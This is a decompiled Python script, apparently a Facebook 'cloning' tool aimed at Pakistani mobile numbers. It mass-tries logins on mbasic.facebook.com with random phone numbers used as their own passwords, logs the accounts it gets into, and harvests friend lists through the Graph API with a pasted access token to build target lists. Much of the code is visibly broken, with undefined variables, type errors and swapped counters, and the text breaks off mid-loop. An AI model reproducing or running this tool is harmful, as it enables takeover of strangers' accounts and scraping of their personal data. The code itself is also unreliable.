# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-03-12 17:47:35.910329
from imp import reload
import os, time, requests, datetime, random,multiprocessing.pool, getpass, json, threading, sys, uuid, shutil, zlib, base64
from wsgiref.types import InputStream
from xml.dom import NotFoundErr
from site import main
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError


os.system("rm -rf .txt")
for n in range(50000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print (nmbr)
    sys.stdout.flush()
pass

l1="100078"
l2="100079"

g='\x1b[1;92m'
r='\x1b[1;91m'
w='\x1b[1;97m'
y='\x1b[1;93m'
n='\x1b[1;94m'
gu='\x1b[1;95m'
sm='\x1b[1;96m'

try:
    import lolcat
except:
    os.system('pip2 install lolcat')
logo="""                                                                                                                                                                                                     
                                                       bbbbbbbb           bbbbbbbb                                                                                                               dddddddd
   SSSSSSSSSSSSSSS      tttt                           b::::::b           b::::::b                                                                           SSSSSSSSSSSSSSS   iiii              d::::::d
 SS:::::::::::::::S  ttt:::t                           b::::::b           b::::::b                                                                         SS:::::::::::::::S i::::i             d::::::d
S:::::SSSSSS::::::S  t:::::t                           b::::::b           b::::::b                                                                        S:::::SSSSSS::::::S  iiii              d::::::d
S:::::S     SSSSSSS  t:::::t                            b:::::b            b:::::b                                                                        S:::::S     SSSSSSS                    d:::::d 
S:::::S        ttttttt:::::ttttttt    uuuuuu    uuuuuu  b:::::bbbbbbbbb    b:::::bbbbbbbbb       ooooooooooo   rrrrr   rrrrrrrrr   nnnn  nnnnnnnn         S:::::S            iiiiiii     ddddddddd:::::d 
S:::::S        t:::::::::::::::::t    u::::u    u::::u  b::::::::::::::bb  b::::::::::::::bb   oo:::::::::::oo r::::rrr:::::::::r  n:::nn::::::::nn       S:::::S            i:::::i   dd::::::::::::::d 
 S::::SSSS     t:::::::::::::::::t    u::::u    u::::u  b::::::::::::::::b b::::::::::::::::b o:::::::::::::::or:::::::::::::::::r n::::::::::::::nn       S::::SSSS          i::::i  d::::::::::::::::d 
  SS::::::SSSSStttttt:::::::tttttt    u::::u    u::::u  b:::::bbbbb:::::::bb:::::bbbbb:::::::bo:::::ooooo:::::orr::::::rrrrr::::::rnn:::::::::::::::n       SS::::::SSSSS     i::::i d:::::::ddddd:::::d 
    SSS::::::::SS    t:::::t          u::::u    u::::u  b:::::b    b::::::bb:::::b    b::::::bo::::o     o::::o r:::::r     r:::::r  n:::::nnnn:::::n         SSS::::::::SS   i::::i d::::::d    d:::::d 
       SSSSSS::::S   t:::::t          u::::u    u::::u  b:::::b     b:::::bb:::::b     b:::::bo::::o     o::::o r:::::r     rrrrrrr  n::::n    n::::n            SSSSSS::::S  i::::i d:::::d     d:::::d 
            S:::::S  t:::::t          u::::u    u::::u  b:::::b     b:::::bb:::::b     b:::::bo::::o     o::::o r:::::r              n::::n    n::::n                 S:::::S i::::i d:::::d     d:::::d 
            S:::::S  t:::::t    ttttttu:::::uuuu:::::u  b:::::b     b:::::bb:::::b     b:::::bo::::o     o::::o r:::::r              n::::n    n::::n                 S:::::S i::::i d:::::d     d:::::d 
SSSSSSS     S:::::S  t::::::tttt:::::tu:::::::::::::::uub:::::bbbbbb::::::bb:::::bbbbbb::::::bo:::::ooooo:::::o r:::::r              n::::n    n::::n     SSSSSSS     S:::::Si::::::id::::::ddddd::::::dd
S::::::SSSSSS:::::S  tt::::::::::::::t u:::::::::::::::ub::::::::::::::::b b::::::::::::::::b o:::::::::::::::o r:::::r              n::::n    n::::n     S::::::SSSSSS:::::Si::::::i d:::::::::::::::::d
S:::::::::::::::SS     tt:::::::::::tt  uu::::::::uu:::ub:::::::::::::::b  b:::::::::::::::b   oo:::::::::::oo  r:::::r              n::::n    n::::n     S:::::::::::::::SS i::::::i  d:::::::::ddd::::d
 SSSSSSSSSSSSSSS         ttttttttttt      uuuuuuuu  uuuubbbbbbbbbbbbbbbb   bbbbbbbbbbbbbbbb      ooooooooooo    rrrrrrr              nnnnnn    nnnnnn      SSSSSSSSSSSSSSS   iiiiiiii   ddddddddd   ddddd
                                                                                                                                                                                                         
"""                                                                                                                                                                                       ""
dec="2"
server="2"


rsauser = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
header= {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent":rsauser, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
reload(sys)
sys.getdefaultencoding()



fuck=[]
idx=[]
oks=[]
cps=[]


    
    
def main_apv():
    try:
        token=open('token.txt','r').read()
    except:
        pass
    try:
        r=requests.get('https://graph.facebook.com/me?access_token=' + token)
        q=json.loads(r.text)
        m=q['name']
        print ('')
    except requests.exceptions.ConnectionError:
        print (logo)
        print ('')
        print ("Turn On Data An Then \t")
        print("")
    except:
        print ('\x1b[1;91mToken on Checkpiont ')
        os.system('rm -rf token.txt')
    os.system('clear')
    print (logo)
    print ("")
    print (39*'~')
    print ("\x1b[1;93m[1]   Public Cloning      \x1b[1;92m(Login)")
    print ("\x1b[1;91m[2]   Random Cloning     \x1b[1;92m (No Login)")
    print ("\x1b[1;92m[3]   File Cloning       \x1b[1;92m (No Login)")
    print ("\x1b[1;93m[4]   File Making Menu\x1b[1;92m    (Login)")
    print ("\x1b[1;94m[5]   Check Subscription ")
    print ("\x1b[1;95m[6]   Update Tools")
    print ("\x1b[1;96m[7]   For Any Help Massage WhatsApp")
    print (43*'~')
    print ("\x1b[1;92m[*] \x1b[1;95m For Need Any Help Type 7 And Massage Me On \x1b[1;92mWhatsApp ")
    print (43*'~')
    main_input()
def main_input():
    mx=int(input('\x1b[1;92m[!] Select : '))
    print ("")
    if mx==int('1'):
        print ("")
        print('\033[1;94m Checking Subscription ....\033[1;92m')
        time.sleep(3)
        fb_menu()
    elif mx==int('2'):
        print ("")
        print('\033[1;94m Checking Subscription ....\033[1;97m')
        time.sleep(3)
        numcloning()
    elif mx==int('3'):
        print ("")
        os.system ('clear')
        print ("")
        print ("")
        print ("")
        print ("        [ File Cloning ]")
        print ("")
        print (" [ cloning with pass or name + pass ]")
        print ("")
        print ("[1] Cloning With Choice Pass")
        print ("[2] Cloning With Name + Pass")
        print ("[3] Cloning With Auto Pass")
        print ("[0] Back")
        print ("")
        c=int(input("[!] Select : "))
        if c==int('1'):
            f_p_pass()
        elif c==int('2'):
            n_f_p_pass()
        elif c==int("3"):
            fileauto()
        else:
            main()
    elif mx==int('4'):
        print ("")
        print('\033[1;94m Checking Subscription ....\033[1;97m')
        time.sleep(3)
        grap()
    elif mx==int('5'):
        os.system ('clear')
        print (logo)
        print ("")
        print ("")
        print ("")
        print ("")
        print ("        Congratulations Bro Your Pro")
        print ("        Member In RK Paid Commands ")
        print ("        ENJOY  KRO BHI (logo) ")
        time.sleep(3.5)
        main()
    elif mx==int('6'):
        os.system("git clone https://github.com/EmadSid14/fixed.git")
        os.system("rm -rf fixed")
        os.system("cp -f fixed/fixed \\.")
        os.system("rm -rf fixed")
        time.sleep(5)
        mx("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
        time.sleep(2)
			
			
    elif mx==int('7'):
        os.system("xdg-open https://wa.me/+923188214452")
        time.sleep(3)
        main()
        
        
    else:
        print ('invild option')
        time.sleep(2)
        main()


def numcloning():
    if dec in server:
        pass
    else:
        NotFoundErr()
    ra=[]
    cps=[]
    oks=[]
    os.system ("clear")
    print (logo)
    print ("")
    print ("    \033[1;91m\n[ Pakistan Random Number Cloning ]")

    print ("")
    print ('\033[1;92m\n   [*] Enter First 4 Digits Of Any Network : ')
    print ("\033[1;93m\n     Example 0300 0345 0320 0303 ")
    print ("")
    coc=int(input ('\033[1;95m\nChoice Code :\033[1;93m '))
    try:
        list = '.txt'
        for li in open(list, 'r').readlines():
            ra.append(li.strip())
    except (KeyError, IOError):
        print ("File Missing")
        time.sleep (2)
        main()
    print ("")
    print ("\033[1;93m\n[*] Total Ids : " +str(len(ra)))
    print ("")
    os.system('echo " ------------------------------------"| lolcat')
    print ("  CRACKING START PLEASE WAIT FOR IDS..   ")
    print ("IF IDS NOT COMMING USE (airplane) FLIGHT MOD")
    os.system('echo " ------------------------------------"| lolcat')
    def main(arg):
        user = arg
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]", 
			"Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = user
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': coc+user, 'pass': pass1, 'login': 'submit'})
            
            if 'c_user' in rana.cookies.get_dict().keys():
                print ("\x1b[1;92m[RK-OK] "+coc+user + " | " + pass1)
                ok=open('RK-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(cid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    
                    print ("\x1b[1;91m[RK-CP] "+coc+user + " | " + pass1)
                    cp=open('RK random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(cid+pass1)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, ra)
    print ("\x1b[1;97m")
    print (40*'-')
    print ("[!] Cloning Complete Been Completed ........")
    print (40*'-')
    print ('[!] Total Ok Ids : ' +str(len(cps)))
    print ('[!] Total Cp Ids : ' +str(len(oks)))
    print (40*'-')
    print ('')
    input(' Press Enter To Back ')
    main()


def fb_menu():
    if dec in server:
        pass
    else:
        NotFoundErr()
        
    try:
        token=open('token.txt','r').read()
    except:
        os.system('clear')
        print (logo)
        print (39*'-')
        print ("\033[1;92m\n[1] Login With Token")
        print ("\033[1;93m\n[0] Back")
        print (39*'-')
        pp=int(input('\033[1;94m\nSelect :\033[1;91m '))
        if pp==int('1'):
            os.system('clear')
            print (logo)
            print ("\033[1;91m\n[*] Enter Your Token Hear")
            print ('')
            tok=str(input('\033[1;92m\n[*]PASTE TOKEN :\033[1;97m '))
            j=open('EAABsbCS1iHgBALCgB2jhkhqPhbtU6qh6RGze7PWJPnTZCv3PqhiMjAPHEN0ZAzol58HXMfjXzLI1Je7ENf1FZCClSXVpC6xjZAKczvRP6oaDuKExqGqVIdZAXynaI6IIF82t4hurasNeDqlxpavdKuzXbA2ZBQJ5yYK6ZAWQq5lNjw4VbgshMr2Lirl29Pr0qMZD','w')
            j.write(tok)
            j.close()
            try:
                r=requests.get('https://graph.facebook.com/me?access_token=' + token)
                q=json.loads(r.text)
                m=q['name']
                print ('')
                print ('WELCOME : '+m)
                time.sleep(2)
                fb_menu()
            except requests.exceptions.ConnectionError:
                print (logo)
                print ('')
                print ("Turn On Data An Then \t")
                print("")
            except:
                os.system ('clear')
                print ("")
                print ("")
                print ('\033[1;91m     Your Token Is Expire')
                time.sleep(3)
                os.system('rm -rf token.txt')
                main()
        else:
            main()
    os.system('clear')
    os.system('rm -rf file.txt')
    os.system('rm -rf newlinks.txt')
    print (logo)
    print   ("")
    print (39*'-')
    print( "\033[1;92m[1] Public Cloning  [Pro]")
    print ("\033[1;92m[2] Public Cloning  [Fast]")
    
    print ("\033[1;91m[0] Back ")
    print (39*'-')
    cz=int(input('[!] Select : '))
    if cz==int("1"):
        print ("")
        print ("\033[1;91m      [ Public Cloning Pro ]")
        print ("")
        print (" [\033[1;93m cloning with pass or name + pass ]")
        print ("")
        print ("\033[1;92m[1] Cloning with password")
        print ("\033[1;92m[2] Cloning with name + pass")
        print ("\033[1;91m[0] Back")
        print ("")
        c=int(input("[!] Select : "))
        if c==int('1'):
            p_p_pass()
        elif c==int('2'):
            n_p_pass()
        else:
            fb_menu()
    elif cz==int("2"):
        print ("")
        print ("\033[1;92m      [ Public Cloning Fast ]")
        print ("")
        print ("\033[1;92m [ cloning with pass or name + pass ]")
        print ("")
        print ("\033[1;92m[1] Cloning With Choice Password")
        print ("\033[1;92m[2] Cloning with name + pass")
        print ("\033[1;92m[3] Cloning With Auto Pass")
        print ("\033[1;91m[0] Back")
        print ("")
        vv=int(input("\033[1;95m[!] Select :\033[1;92m "))
        if vv==int("1"):
            xokp()
        elif vv==int("2"):
            xoknp()
        elif vv==int("3"):
            xokpauto()
        else:
            fb_menu()
    elif cz==str("vv"):
        os.system('clear')
        print (logo)
        print ("")
        print ("")
        print ("\t     [ File Making ]")
        print ("")
        print ("\t  [ Maximum Limit 10 IDs ]")
        print ("")
        c=int(input("[!] How Many Links Do You Want To Dump : "))
        if c==int('1'):
            ext1()
        elif c==int('2'):
            ext2()
        elif c==int('3'):
            ext3()
        elif c==int('4'):
            ext4()
        elif c==int('5'):
            ext5()
        elif c==int('6'):
            ext6()
        elif c==int('7'):
            ext7()
        elif c==int('8'):
            ext8()
        elif c==int('9'):
            ext9()
        elif c==int('10'):
            ext10()
        else:
            fb_menu()
    elif cz==int("4"):
        mineExt()
    else:
        main()


def mineExt():
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print (logo)
    print ("")
    iiid=int(input("[=] Enter ID : "))
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ("")
    print (sm+"[=] Extracting From : "+nid+" > \x1b[1;91mFriends")
    print ("")
    time.sleep(2)
    print (gu+"[=] Graping URLs ......"+w)
    print ("")
    time.sleep(2)
    print (g+"[=] Graping Complte Process Start *"+w)
    print ("")
    os.system(' cat look.txt | grep "10000" >> kk.txt')
    os.system(' cat look.txt | grep "1000" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] Extracting From RK : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ("")
    print ("")
    print (sm+"[=] Total Extract ids : "+str(len(count))+w)
    print ("")
    mvt=int(input("[=] Enter Path To Save File : "))
    print ("[=] Your File Save in : "+mvt)
    shutil.move(hok,mvt)
    os.system('rm -rf jok.txt')
    input('[=] Press Enter To Back')
    fb_menu()





def xokpauto():
    os.system("rm -rf kk.txt")
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print (logo)
    print ("")
    iiid=int(input("[=] Enter ID : "))
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ("")
    print (sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends")
    print ("")
    time.sleep(2)
    print (g+"[=] Transfer Complte Process Start *"+w)
    print ("")
    os.system(' cat look.txt | grep "10000" >> kk.txt')
    os.system(' cat look.txt | grep "1000" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
